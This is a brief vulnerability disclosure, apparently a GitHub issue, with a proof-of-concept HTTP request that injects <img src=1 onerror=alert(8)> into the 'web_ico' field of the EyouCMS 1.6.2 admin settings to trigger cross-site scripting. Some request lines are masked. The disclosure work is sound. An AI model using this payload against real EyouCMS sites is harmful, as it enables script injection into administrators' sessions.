eyoucms up to 1.6.2  reflected xss vulnerability POC: 

```
POST /eyoucms/login.php?m=admin&c=System&a=web&lang=cn HTTP/1.1
*****************************************************

------WebKitFormBoundaryq3khRwDr0dBifJAy
********************************************

------WebKitFormBoundaryq3khRwDr0dBifJAy
Content-Disposition: form-data; name="web_ico"

<img src=1 onerror=alert(8)>
------WebKitFormBoundaryq3khRwDr0dBifJAy
**********************************************

------WebKitFormBoundaryq3khRwDr0dBifJAy--

```

![image](https://user-images.githubusercontent.com/55875284/230613377-31d58542-9d0f-466c-8a32-5e09e7b7a6ee.png)

Then when click the icon again, a XSS will be triggered

![image](https://user-images.githubusercontent.com/55875284/230613905-562f9d39-0078-4b1a-898c-2a43f3909ef7.png)
